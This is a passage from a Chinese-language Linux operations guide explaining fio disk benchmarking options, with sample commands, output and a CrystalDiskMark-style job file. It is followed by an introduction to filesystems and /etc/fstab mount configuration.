\u200b\u5bf9\u200b\u6027\u80fd\u200b\u5f71\u54cd\u200b\u5f88\u5927\u200b\uff0c\u200b\u7535\u5546\u200b\u5e73\u53f0\u200b\u786c\u76d8\u200b\u6807\u79f0\u200b\u7684\u200b\u901f\u5ea6\u200b\u901a\u5e38\u200b\u90fd\u200b\u662f\u200b 1MB \u200b\u5927\u5757\u200b\u987a\u5e8f\u200b\u8bfb\u5199\u200b\u7684\u200b\u901f\u5ea6\u200b\uff08\u200b\u4ee3\u8868\u200b\u4e86\u200b\u62f7\u8d1d\u200b\u5927\u200b\u6587\u4ef6\u200b\u65f6\u200b\u7684\u200b\u901f\u5ea6\u200b\uff09\uff0c\u200b\u800c\u200b\u66f4\u52a0\u200b\u5f71\u54cd\u200b\u5b9e\u9645\u200b\u4f7f\u7528\u200b\u4f53\u9a8c\u200b\u7684\u200b 4k \u200b\u7684\u200b\u968f\u673a\u200b\u8bfb\u5199\u200b\u6027\u80fd\u200b\u5219\u200b\u8981\u200b\u5f31\u200b\u5f97\u200b\u591a\u200b\u3002</li> <li> <p><code>--size</code>\uff1a\u200b\u6d4b\u8bd5\u200b\u6587\u4ef6\u200b\u7684\u200b\u5927\u5c0f\u200b\u3002\u200b\u652f\u6301\u200b k/m/g/t/p \u200b\u540e\u7f00\u200b\uff08\u200b\u5b57\u8282\u200b B \u200b\u53ef\u4ee5\u200b\u7701\u7565\u200b\uff09\uff0c\u200b\u4e0d\u200b\u533a\u5206\u200b\u5927\u5c0f\u5199\u200b\u3002\u200b\u4f7f\u7528\u200b 1024 \u200b\u500d\u7387\u200b\uff0c\u200b\u8981\u200b\u4f7f\u7528\u200b 1000 \u200b\u500d\u7387\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>kib</code>, <code>mib</code> \u200b\u7b49\u200b\u3002</p> <p>SI \u200b\u4e0e\u200b IEC \u200b\u5355\u4f4d\u200b</p> <p>SI \u200b\u5355\u4f4d\u200b\u662f\u200b\u56fd\u9645\u200b\u5355\u4f4d\u5236\u200b\u4e2d\u200b\u7684\u200b\u5355\u4f4d\u200b\uff0c\u200b\u91c7\u7528\u200b 10 \u200b\u8fdb\u5236\u200b\uff08\u200b\u5373\u200b 1 KB = 1000 B\uff09\uff1bIEC \u200b\u5355\u4f4d\u200b\u662f\u200b\u56fd\u9645\u7535\u5de5\u59d4\u5458\u4f1a\u200b\u7684\u200b\u5355\u4f4d\u200b\uff0c\u200b\u91c7\u7528\u200b\u4e8c\u8fdb\u5236\u200b\u548c\u200b\u5e26\u6709\u200b i \u200b\u7684\u200b\u5355\u4f4d\u200b\uff08\u200b\u5373\u200b 1 KiB = 1024 B\uff09\u3002</p> <p>fio \u200b\u51fa\u4e8e\u200b\u5bf9\u200b\u65e7\u200b\u811a\u672c\u200b\u7684\u200b\u517c\u5bb9\u6027\u200b\uff0c\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u4ea4\u6362\u200b\u4e86\u200b SI \u200b\u548c\u200b IEC \u200b\u5355\u4f4d\u200b\u7684\u200b\u542b\u4e49\u200b\uff0c\u200b\u5373\u4e0d\u5e26\u200b i \u200b\u7684\u200b\u4f7f\u7528\u200b 1024 \u200b\u500d\u7387\u200b\uff0c\u200b\u800c\u200b\u5e26\u200b i \u200b\u7684\u200b\u91c7\u7528\u200b 1000 \u200b\u500d\u7387\u200b\u3002\u200b\u8fd9\u200b\u5728\u200b fio \u200b\u6587\u6863\u200b\u4e2d\u6709\u200b\u8bf4\u660e\u200b\uff08\u200b\u53c2\u6570\u200b <code>kb_base</code>\uff09\u3002</p> </li> <li> <p><code>--ioengine</code>\uff1a\u200b\u4f7f\u7528\u200b\u7684\u200b I/O \u200b\u5f15\u64ce\u200b\u3002\u200b\u9ed8\u8ba4\u200b\u4e3a\u200b <code>psync</code>\uff08\u200b\u4f7f\u7528\u200b pread/pwrite \u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\uff09\u3002\u200b\u5728\u200b Linux \u200b\u4e0a\u200b\u63a8\u8350\u200b\u9009\u62e9\u200b <code>libaio</code> \u200b\u6765\u200b\u4f7f\u7528\u200b\u7cfb\u7edf\u200b\u7684\u200b\u5f02\u6b65\u200b I/O \u200b\u63a5\u53e3\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5efa\u8bae\u200b\u6dfb\u52a0\u200b <code>--direct=1</code> \u200b\u53c2\u6570\u200b\u4f7f\u7528\u200b\u975e\u200b\u7f13\u51b2\u200b I/O\uff0c\u200b\u56e0\u4e3a\u200b Linux \u200b\u4e0a\u200b\u7f13\u51b2\u200b I/O \u200b\u4e0d\u662f\u200b\u5f02\u6b65\u200b\u7684\u200b\u3002</p> </li> <li><code>--iodepth</code>: \u200b\u5e76\u53d1\u200b\uff08\u200b\u5904\u4e8e\u200b\u672a\u200b\u5b8c\u6210\u200b\u72b6\u6001\u200b\u7684\u200b\uff09I/O \u200b\u64cd\u4f5c\u200b\u7684\u200b\u6570\u91cf\u200b\uff0c\u200b\u901a\u5e38\u200b\u548c\u200b\u5f02\u6b65\u200b I/O \u200b\u5f15\u64ce\u200b\u7ed3\u5408\u200b\u4f7f\u7528\u200b\u3002\u200b\u589e\u52a0\u200b <code>iodepth</code> \u200b\u53ef\u4ee5\u200b\u663e\u8457\u200b\u63d0\u9ad8\u200b\u541e\u5410\u91cf\u200b\u3002</li> <li><code>--numjobs</code>\uff1afork \u200b\u82e5\u5e72\u200b\u8fdb\u7a0b\u200b\u6267\u884c\u200b\u76f8\u540c\u200b\u7684\u200b I/O \u200b\u4efb\u52a1\u200b\uff0c\u200b\u7528\u4e8e\u200b\u8fdb\u884c\u200b\u5e76\u53d1\u200b\u6d4b\u8bd5\u200b\u3002\u200b\u6b64\u65f6\u200b\u5efa\u8bae\u200b\u6dfb\u52a0\u200b <code>--group_reporting</code> \u200b\u53c2\u6570\u200b\uff0c\u200b\u8fd9\u6837\u200b\u6240\u6709\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u6570\u636e\u200b\u4f1a\u200b\u88ab\u200b\u7d2f\u52a0\u200b\u5230\u200b\u4e00\u8d77\u200b\u3002</li> </ul> <p>\u200b\u8fd8\u6709\u200b\u4e00\u4e9b\u200b\u5176\u4ed6\u200b\u7684\u200b\u53c2\u6570\u200b\u5f71\u54cd\u200b fio \u200b\u5982\u4f55\u200b\u8fd0\u884c\u200b\uff1a</p> <ul> <li><code>--filename</code>\uff1a\u200b\u6d4b\u8bd5\u200b\u7684\u200b\u6587\u4ef6\u540d\u200b\u6216\u8005\u200b\u5757\u200b\u8bbe\u5907\u200b\u540d\u200b\u3002fio \u200b\u9ed8\u8ba4\u200b\u4e3a\u200b\u6bcf\u4e2a\u200b\u4efb\u52a1\u200b\u751f\u6210\u200b\u5355\u72ec\u200b\u6d4b\u8bd5\u200b\u6587\u4ef6\u200b\uff0c\u200b\u4f7f\u7528\u200b\u8be5\u200b\u9009\u9879\u200b\u4f7f\u200b\u6240\u6709\u200b\u4efb\u52a1\u200b\u4f7f\u7528\u200b\u76f8\u540c\u200b\u6587\u4ef6\u200b\u3002\u200b\u4f7f\u7528\u200b\u76f8\u5bf9\u8def\u5f84\u200b\u65f6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b<code>--directory</code>\u200b\u6307\u5b9a\u200b\u6d4b\u8bd5\u200b\u6587\u4ef6\u200b\u7684\u200b\u76ee\u5f55\u200b\uff08\u200b\u9ed8\u8ba4\u200b\u4e3a\u200b\u5f53\u524d\u76ee\u5f55\u200b\uff09\u3002</li> <li><code>--name</code>\uff1a\u200b\u4efb\u52a1\u200b\u7684\u200b\u540d\u79f0\u200b\u3002fio \u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u8fd0\u884c\u200b\u591a\u4e2a\u200b\u6d4b\u8bd5\u200b\u4efb\u52a1\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u4efb\u52a1\u200b\u90fd\u200b\u6709\u200b\u4e00\u4e2a\u200b\u540d\u79f0\u200b\u3002\u200b\u547d\u4ee4\u884c\u200b\u53c2\u6570\u200b\u4e2d\u200b\u6bcf\u200b\u9047\u5230\u200b\u4e00\u4e2a\u200b <code>--name</code> \u200b\u4f1a\u200b\u5b9a\u4e49\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u4efb\u52a1\u200b\uff0c\u200b\u540e\u9762\u200b\u8ddf\u968f\u200b\u8be5\u200b\u4efb\u52a1\u200b\u7684\u200b\u53c2\u6570\u200b\u3002</li> <li><code>--stonewall</code>\uff1a\u200b\u7b49\u5f85\u200b\u524d\u200b\u4e00\u4e2a\u200b\u4efb\u52a1\u200b\u5b8c\u6210\u200b\u624d\u200b\u5f00\u59cb\u200b\u8fd9\u200b\u4e00\u4e2a\u200b\u4efb\u52a1\u200b\uff0cfio \u200b\u9ed8\u8ba4\u200b\u6240\u6709\u200b\u4efb\u52a1\u200b\u662f\u200b\u540c\u65f6\u200b\u6267\u884c\u200b\u7684\u200b\u3002</li> <li><code>--runtime</code>\uff1a\u200b\u6d4b\u8bd5\u200b\u7684\u200b\u6700\u5927\u200b\u65f6\u95f4\u200b\u957f\u5ea6\u200b\uff08\u200b\u65e0\u200b\u5355\u4f4d\u200b\u5219\u200b\u4e3a\u200b\u79d2\u200b\uff09\u3002\u200b\u53ef\u4ee5\u200b\u6dfb\u52a0\u200b <code>--time_based</code> \u200b\u53c2\u6570\u200b\u9632\u6b62\u200b\u4efb\u52a1\u200b\u5b8c\u6210\u200b\u800c\u200b\u63d0\u524d\u7ed3\u675f\u200b</li> <li><code>--readonly</code>\uff1a\u200b\u68c0\u67e5\u200b\u5f53\u524d\u4efb\u52a1\u200b\u662f\u5426\u200b\u4e3a\u200b\u53ea\u8bfb\u200b\u4efb\u52a1\u200b\uff0c\u200b\u9632\u6b62\u200b\u8bef\u64cd\u4f5c\u200b\u5bfc\u81f4\u200b\u6570\u636e\u200b\u4e22\u5931\u200b\u3002</li> <li><code>--loops</code>: \u200b\u591a\u6b21\u200b\u6d4b\u8bd5\u200b\u53d6\u200b\u5e73\u5747\u503c\u200b\u3002</li> </ul> <p>\u200b\u4ee5\u4e0b\u200b\u662f\u200b\u4e00\u4e9b\u200b\u4f8b\u5b50\u200b\uff0c\u200b\u4e00\u90e8\u5206\u200b\u5728\u200b\u7f16\u5199\u200b\u5176\u4ed6\u200b\u5185\u5bb9\u200b\u65f6\u200b\u4f7f\u7528\u200b\u5230\u200b\u4e86\u200b\uff1a</p> <p>\u200b\u5bf9\u200b\u6b63\u5728\u200b\u8fd0\u884c\u200b\u7684\u200b\u5757\u200b\u8bbe\u5907\u200b\u64cd\u4f5c\u200b\u65f6\u200b\u9700\u8981\u200b\u5c0f\u5fc3\u200b</p> <p>\u200b\u5bf9\u200b\u5df2\u7ecf\u200b\u6709\u200b\u6570\u636e\u200b\u7684\u200b\u5757\u200b\u8bbe\u5907\u200b\u8fdb\u884c\u200b\u5199\u5165\u200b\u64cd\u4f5c\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u6570\u636e\u200b\u4e22\u5931\u200b\uff0c\u200b\u5728\u200b\u6d4b\u8bd5\u200b\u65f6\u8bf7\u200b\u52a0\u4e0a\u200b <code>--readonly</code> \u200b\u53c2\u6570\u200b\u3002</p> \u200b\u4f7f\u7528\u200b fio \u200b\u6d4b\u8bd5\u200b\u5757\u200b\u8bbe\u5907\u200b\uff08<code>/dev/mapper/vg201--test-lvdata</code>\uff09\u200b\u968f\u673a\u200b\u8bfb\u200b\u5ef6\u8fdf\u200b\u7684\u200b\u4f8b\u5b50\u200b <p>\u200b\u672c\u200b\u90e8\u5206\u200b\u7f16\u5199\u200b\u65f6\u200b\u53c2\u8003\u200b\u4e86\u200b Oracle \u200b\u7684\u200b\u6587\u6863\u200b\u3002</p> <p>\u200b\u4e00\u4e2a\u200b\u53ea\u8bfb\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u6d4b\u8bd5\u200b 10s <code>/dev/mapper/vg201--test-lvdata</code> \u200b\u7684\u200b 4K \u200b\u968f\u673a\u200b\u8bfb\u200b\u7684\u200b\u4f8b\u5b50\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>$ sudo fio --filename=/dev/mapper/vg201--test-lvdata \\\n    --direct=1 --rw=randread --bs=4k \\\n    --ioengine=libaio --iodepth=1 --numjobs=1 \\\n    --time_based --group_reporting --name=readlatency-test-job \\\n    --runtime=10 --eta-newline=1 --readonly\nreadlatency-test-job: (g=0): rw=randread, bs=(R) 4096B-4096B, (W) 4096B-4096B, (T) 4096B-4096B, ioengine=libaio, iodepth=1\nfio-3.36\nStarting 1 process\nfio: file /dev/mapper/vg201--test-lvdata exceeds 32-bit tausworthe random generator.\nfio: Switching to tausworthe64. Use the random_generator= option to get rid of this warning.\nJobs: 1 (f=1): [r(1)][30.0%][r=233MiB/s][r=59.6k IOPS][eta 00m:07s]\nJobs: 1 (f=1): [r(1)][50.0%][r=218MiB/s][r=55.9k IOPS][eta 00m:05s] \nJobs: 1 (f=1): [r(1)][70.0%][r=226MiB/s][r=57.8k IOPS][eta 00m:03s] \nJobs: 1 (f=1): [r(1)][90.0%][r=219MiB/s][r=56.1k IOPS][eta 00m:01s] \nJobs: 1 (f=1): [r(1)][100.0%][r=220MiB/s][r=56.2k IOPS][eta 00m:00s]\nreadlatency-test-job: (groupid=0, jobs=1): err= 0: pid=1334208: Sat Feb 17 23:46:54 2024\nread: IOPS=56.0k, BW=219MiB/s (229MB/s)(2186MiB/10001msec)\n    slat (nsec): min=1143, max=870047, avg=2109.53, stdev=1843.07\n    clat (nsec): min=211, max=26562k, avg=14946.90, stdev=60736.24\n    lat (usec): min=10, max=26564, avg=17.06, stdev=60.82\n    clat percentiles (usec):\n    |  1.00th=[   10],  5.00th=[   12], 10.00th=[   12], 20.00th=[   13],\n    | 30.00th=[   13], 40.00th=[   13], 50.00th=[   13], 60.00th=[   13],\n    | 70.00th=[   14], 80.00th=[   15], 90.00th=[   22], 95.00th=[   23],\n    | 99.00th=[   52], 99.50th=[   76], 99.90th=[  174], 99.95th=[  243],\n    | 99.99th=[  465]\nbw (  KiB/s): min=185288, max=249304, per=100.00%, avg=223874.11, stdev=13053.14, samples=19\niops        : min=46322, max=62326, avg=55968.53, stdev=3263.28, samples=19\nlat (nsec)   : 250=0.01%, 500=0.01%, 750=0.01%, 1000=0.01%\nlat (usec)   : 2=0.01%, 4=0.01%, 10=1.43%, 20=87.06%, 50=10.48%\nlat (usec)   : 100=0.75%, 250=0.24%, 500=0.03%, 750=0.01%, 1000=0.01%\nlat (msec)   : 2=0.01%, 4=0.01%, 10=0.01%, 20=0.01%, 50=0.01%\ncpu          : usr=7.91%, sys=18.76%, ctx=560581, majf=0, minf=23\nIO depths    : 1=100.0%, 2=0.0%, 4=0.0%, 8=0.0%, 16=0.0%, 32=0.0%, &gt;=64=0.0%\n    submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n    complete  : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n    issued rwts: total=559688,0,0,0 short=0,0,0,0 dropped=0,0,0,0\n    latency   : target=0, window=0, percentile=100.00%, depth=1\n\nRun status group 0 (all jobs):\nREAD: bw=219MiB/s (229MB/s), 219MiB/s-219MiB/s (229MB/s-229MB/s), io=2186MiB (2292MB), run=10001-10001msec\n</code></pre> \u200b\u5411\u200b <code>./test</code> \u200b\u968f\u673a\u200b\u8bfb\u5199\u200b\uff0c\u200b\u6a21\u62df\u200b I/O \u200b\u538b\u529b\u200b <pre><code>sudo fio --filename=./test \\\n  --filesize=2G --direct=1 --rw=randrw \\\n  --bs=4k --ioengine=libaio --iodepth=256 \\\n  --runtime=120 --numjobs=4 --time_based \\\n  --group_reporting --name=job_name --eta-newline=1\n</code></pre> \u200b\u6a21\u62df\u200b Crystal DiskMark \u200b\u6d4b\u8bd5\u200b\u78c1\u76d8\u200b\u6027\u80fd\u200b <p>\u200b\u672c\u200b\u90e8\u5206\u200b\u6765\u81ea\u200b Raspberry Pi 4 B Review and Benchmark - What\u2019s improved over Pi 3 B+\u3002</p> <pre><code>sudo fio --loops=5 --size=500m --filename=fiotest.tmp --stonewall --ioengine=libaio --direct=1 \\\n    --name=SeqRead --bs=1m --rw=read \\\n    --name=SeqWrite --bs=1m --rw=write \\\n    --name=512Kread --bs=512k --rw=randread \\\n    --name=512Kwrite --bs=512k --rw=randwrite \\\n    --name=4KQD32read --bs=4k --iodepth=32 --rw=randread \\\n    --name=4KQD32write --bs=4k --iodepth=32 --rw=randwrite \\\n    --name=4Kread --bs=4k --rw=randread \\\n    --name=4Kwrite --bs=4k --rw=randwrite\n</code></pre> <p>\u200b\u7531\u4e8e\u200b\u6027\u80fd\u200b\u6d4b\u8bd5\u200b\u7684\u200b\u53c2\u6570\u200b\u901a\u5e38\u200b\u4f1a\u200b\u5f88\u957f\u200b\uff0cfio \u200b\u8fd8\u200b\u652f\u6301\u200b\u5c06\u200b\u53c2\u6570\u200b\u653e\u7f6e\u200b\u5728\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u200b\uff0c\u200b\u4fbf\u4e8e\u200b\u4fee\u6539\u200b\u548c\u200b\u91cd\u590d\u4f7f\u7528\u200b\u3002</p> <p>fio \u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u88ab\u200b\u79f0\u4e3a\u200b job \u200b\u6587\u4ef6\u200b\uff0c\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e00\u7ec4\u200b\u9700\u8981\u200b\u6a21\u62df\u200b\u7684\u200b I/O \u200b\u8d1f\u8f7d\u200b\u3002fio \u200b\u652f\u6301\u200b\u8f93\u5165\u200b\u591a\u4e2a\u200b job \u200b\u6587\u4ef6\u200b\uff0c\u200b\u6bcf\u4e2a\u200b job \u200b\u6587\u4ef6\u200b\u4f1a\u200b\u4f9d\u6b21\u200b\u8fd0\u884c\u200b\u3002\u200b\u800c\u200b job \u200b\u6587\u4ef6\u200b\u5185\u200b\u7684\u200b\u4efb\u52a1\u200b\u9ed8\u8ba4\u200b\u662f\u200b\u5e76\u884c\u200b\u8fd0\u884c\u200b\u7684\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>stonewall</code> \u200b\u53c2\u6570\u200b\u6765\u200b\u4fdd\u8bc1\u200b\u4e32\u884c\u200b\u3002</p> <p>Job \u200b\u6587\u4ef6\u200b\u4f7f\u7528\u200b ini \u200b\u683c\u5f0f\u200b\uff0c\u200b\u901a\u5e38\u200b\u5305\u62ec\u200b\u4e00\u4e2a\u200b global \u200b\u8282\u200b\u5b9a\u4e49\u200b\u5171\u4eab\u200b\u53c2\u6570\u200b\u548c\u200b\u82e5\u5e72\u4e2a\u200b job \u200b\u8282\u200b\u5b9a\u4e49\u200b\u6bcf\u4e2a\u200b I/O \u200b\u4efb\u52a1\u200b\u7684\u200b\u53c2\u6570\u200b\uff08\u200b\u53ef\u4ee5\u200b\u8986\u76d6\u200b global \u200b\u8282\u200b\u7684\u200b\u53c2\u6570\u200b\uff09\u3002</p> \u200b\u6a21\u62df\u200b Crystal DiskMark \u200b\u6d4b\u8bd5\u200b\u78c1\u76d8\u200b\u6027\u80fd\u200b job \u200b\u6587\u4ef6\u200b <pre><code>[global]\nioengine=libaio\ndirect=1\nsize=4g\nruntime=60\nloops=3\n\n[Read SEQ1M Q8T1]\nbs=1m\niodepth=8\nrw=read\n\n[Read SEQ1M Q1T1]\nstonewall\nbs=1m\nrw=read\n\n[Read RND4K Q32T1]\nstonewall\nbs=4k\niodepth=32\nrw=randread\n\n[Read RND4K Q1T1]\nstonewall\nbs=4k\niodepth=1\nrw=randread\n\n[Write SEQ1M Q8T1]\nbs=1m\niodepth=8\nrw=write\n\n[Write SEQ1M Q1T1]\nstonewall\nbs=1m\nrw=write\n\n[Write RND4K Q32T1]\nstonewall\nbs=4k\niodepth=32\nrw=randwrite\n\n[Write RND4K Q1T1]\nstonewall\nbs=4k\niodepth=1\nrw=randwrite\n</code></pre> <p>\u200b\u4fdd\u5b58\u200b\u4e3a\u200b<code>fio_CrystalDiskMark.ini</code>\uff0c\u200b\u7136\u540e\u200b\u8fd0\u884c\u200b</p> <pre><code>fio --filename=./test.bin fio_CrystalDiskMark.ini\n</code></pre> <p>fio \u200b\u8f93\u51fa\u200b\u5185\u5bb9\u200b\u6bd4\u8f83\u200b\u4e30\u5bcc\u200b\uff0c\u200b\u9664\u4e86\u200b\u5e26\u5bbd\u200b BW \u200b\u5916\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u5173\u6ce8\u200b IOPS\u3001\u200b\u63d0\u4ea4\u200b\u5ef6\u8fdf\u200b (slat)\u3001\u200b\u5b8c\u6210\u200b\u5ef6\u8fdf\u200b (clat)\u3001\u200b\u4ee5\u53ca\u200b iodepth \u200b\u5206\u5e03\u200b\u7b49\u200b\u3002\u200b\u8f93\u51fa\u200b\u5185\u5bb9\u200b\u5177\u4f53\u200b\u542b\u4e49\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b man \u200b\u624b\u518c\u200b OUTPUT \u200b\u8282\u200b\u3002</p>"},{"location":"ops/storage/intro/#filesystem","title":"\u6587\u4ef6\u7cfb\u7edf","text":"<p>\u200b\u5728\u200b Linux \u200b\u4e0a\u200b\uff0cext4 \u200b\u662f\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u3002\u200b\u4f46\u662f\u200b\u5bf9\u4e8e\u200b\u67d0\u4e9b\u200b\u9700\u6c42\u200b\uff0cext4 \u200b\u53ef\u80fd\u200b\u65e0\u6cd5\u200b\u6ee1\u8db3\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <ul> <li>\u200b\u9700\u8981\u200b\u652f\u6301\u200b\u5b58\u50a8\u200b\u5927\u91cf\u6587\u4ef6\u200b\uff0c\u200b\u6570\u91cf\u200b\u751a\u81f3\u200b\u53ef\u80fd\u200b\u8d85\u8fc7\u200b ext4 \u200b\u7684\u200b\u9650\u5236\u200b</li> <li>\u200b\u9700\u8981\u200b\u652f\u6301\u200b\u5feb\u7167\u200b\u3001\u200b\u900f\u660e\u200b\u538b\u7f29\u200b\u3001\u200b\u6570\u636e\u200b\u6821\u9a8c\u200b\u7b49\u200b\u9ad8\u7ea7\u200b\u529f\u80fd\u200b</li> </ul> <p>\u200b\u5728\u200b\u300c\u200b\u5206\u533a\u200b\u4e0e\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u300d\u200b\u90e8\u5206\u200b\u4f1a\u200b\u5bf9\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u9009\u62e9\u200b\u8fdb\u884c\u200b\u4ecb\u7ecd\u200b\u3002 \u200b\u672c\u200b\u90e8\u5206\u200b\u4e3b\u8981\u200b\u4ecb\u7ecd\u200b\u4e0e\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u3001\u200b\u6302\u8f7d\u200b\u7b49\u200b\u6709\u5173\u200b\u7684\u200b\u901a\u7528\u200b\u5185\u5bb9\u200b\u3002</p>"},{"location":"ops/storage/intro/#fstab","title":"<code>/etc/fstab</code>","text":"<p><code>/etc/fstab</code> \u200b\u662f\u200b Linux \u200b\u7cfb\u7edf\u200b\u4e2d\u200b\u7528\u4e8e\u200b\u914d\u7f6e\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u6302\u8f7d\u200b\u7684\u200b\u6587\u4ef6\u200b\u3002 \u200b\u5728\u200b\u542f\u52a8\u200b\u65f6\u200b\uff0c\u200b\u7cfb\u7edf\u200b\u4f1a\u200b\u6839\u636e\u200b <code>/etc/fstab</code> \u200b\u4e2d\u200b\u7684\u200b\u914d\u7f6e\u200b\u81ea\u52a8\u200b\u6302\u8f7d\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u3002 \u200b\u5982\u679c\u200b\u914d\u7f6e\u200b\u4e0d\u5f53\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5f00\u673a\u200b\u65f6\u200b\u5c31\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u6302\u8f7d\u200b\u5931\u8d25\u200b\uff0c\u200b\u4ece\u800c\u200b\u8fdb\u5165\u200b\u7d27\u6025\u200b\u6a21\u5f0f\u200b\u7684\u200b\u60c5\u51b5\u200b\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u7ed9\u51fa\u200b\u4e00\u4e2a\u200b\u5728\u200b QEMU \u200b\u865a\u62df\u673a\u200b\u4e2d\u200b\u7684\u200b Linux \u200b\u7cfb\u7edf\u200b\u7684\u200b <code>/etc/fstab</code> \u200b\u7684\u200b\u4f8b\u5b50\u200b\uff1a</p> <pre><code># &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;\nUUID=6cf8f654-9a14-4703-be4e-c5a059c9f7f8 /               ext4    errors=remount-ro 0       1\n/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0\nsharing /mnt/sharing    virtiofs    defaults,nofail 0   0\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u7b2c\u4e00\u200b\u90e8\u5206\u200b\u5b9a\u4f4d\u200b\u4e86\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u7269\u7406\u200b\u78c1\u76d8\u200b\u6765\u8bf4\u200b\uff0c\u200b\u4f7f\u7528\u200b UUID \u200b\u662f\u200b\u6bd4\u8f83\u200b\u597d\u200b\u7684\u200b\u9009\u62e9\u200b\uff0c\u200b\u8be6\u60c5\u200b\u53ef\u200b\u53c2\u8003\u200b\u5206\u533a\u200b\u4e0e\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e2d\u200b\u5bf9\u200b <code>/dev/disk</code> \u200b\u7684\u200b\u4ecb\u7ecd\u200b\u3002<code>/dev/sda1</code> \u200b\u8fd9\u6837\u200b\u7684\u200b\u8bbe\u5907\u200b\u540d\u200b\u867d\u7136\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\uff0c\u200b\u4f46\u662f\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u610f\u6599\u4e4b\u5916\u200b\u7684\u200b\u95ee\u9898\u200b\u3002 \u200b\u5bf9\u200b\u7279\u6b8a\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u7684\u200b\u5185\u5bb9\u200b\u7531\u200b\u5bf9\u5e94\u200b\u7684\u200b\u5b9e\u73b0\u200b\u51b3\u5b9a\u200b\uff0c\u200b\u4f8b\u5982\u200b <code>tmpfs</code> \u200b\u7684\u8bdd\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u53ef\u80fd\u200b\u5c31\u662f\u200b <code>none</code> \u200b\u6216\u8005\u200b <code>tmpfs</code>\uff1b \u200b\u4f8b\u5b50\u200b\u4e2d\u200b\u7684\u200b <code>virtiofs</code> \u200b\u662f\u200b QEMU \u200b\u7684\u200b\u865a\u62df\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u7528\u4e8e\u200b\u4e0e\u200b\u5bbf\u4e3b\u673a\u200b\u5171\u4eab\u200b\u6587\u4ef6\u200b\uff0c \u200b\u7531\u4e8e\u200b\u8bbe\u7f6e\u200b\u4e2d\u200b\u7684\u200b <code>target</code> \u200b\u662f\u200b <code>sharing</code>\uff0c\u200b\u56e0\u6b64\u200b\u8fd9\u91cc\u200b\u7684\u200b\u8bbe\u5907\u200b\u540d\u662f\u200b <code>sharing</code>\u3002</p> <p>\u200b\u540e\u9762\u200b\u5219\u200b\u662f\u200b\u6302\u8f7d\u200b\u70b9\u200b\u3001\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e0e\u200b\u6302\u8f7d\u200b\u9009\u9879\u200b\u3002\u200b\u6302\u8f7d\u200b\u9009\u9879\u200b\u4e2d\u200b\u5927\u90e8\u5206\u200b\u4f1a\u200b\u63d0\u4f9b\u200b\u7ed9\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff08\u200b\u4f8b\u5982\u200b\u8fd9\u91cc\u200b\u7684\u200b <code>errors=remount-ro</code>\uff09\uff0c\u200b\u4f46\u662f\u200b\u6709\u200b\u4e00\u4e9b\u200b\u662f\u200b\u901a\u7528\u200b\u7684\u200b\u8bbe\u7f6e\u200b\u3002 \u200b\u4f8b\u5982\u200b <code>noauto</code> \u200b\u9009\u9879\u200b\u8868\u793a\u200b\u542f\u52a8\u200b\u65f6\u200b\u4e0d\u200b\u6302\u8f7d\u200b\uff0c<code>nofail</code> \u200b\u8868\u793a\u200b\u5373\u4f7f\u200b\u6302\u8f7d\u200b\u5931\u8d25\u200b\u4e5f\u200b\u4e0d\u200b\u5f71\u54cd\u200b\u542f\u52a8\u200b\u3002 \u200b\u4e00\u4e2a\u200b\u5728\u200b fstab(5) \u200b\u4e2d\u200b\u6ca1\u6709\u200b\u63d0\u53ca\u200b\u7684\u200b\u91cd\u8981\u200b\u9009\u9879\u200b\u662f\u200b <code>_netdev</code>\uff0c\u200b\u5b83\u200b\u8868\u793a\u200b\u8fd9\u4e2a\u200b\u6302\u8f7d\u200b\u70b9\u200b\u9700\u8981\u200b\u7f51\u7edc\u8fde\u63a5\u200b\uff0c systemd 